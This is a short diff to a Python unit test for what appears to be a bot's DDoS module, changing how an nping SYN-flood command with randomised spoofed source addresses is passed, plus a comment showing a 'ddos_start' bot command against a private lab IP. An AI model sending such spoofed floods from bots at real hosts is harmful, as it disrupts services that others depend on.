@@ -11,10 +11,10 @@ from domain.Bot import Bot
 class Test(unittest.TestCase):
 
 
-    def Module(self):
-        args = "nping --tcp -S random -p 80 -g random --flags SYN --delay 10ms -c 5 192.168.41.132"
+    def testModule(self):
+        args = "--tcp -S random -p 80 -g random --flags SYN --delay 10ms -c 5 192.168.41.132"
         ddos = DDoSModule()
-        ddos.start(args)
+        ddos.start(args.split())
         
     def testDDoS(self):
         #r ddos_start 0 0 --tcp -S random -p 80 -g random --flags SYN --delay 10ms -c 5 192.168.41.132
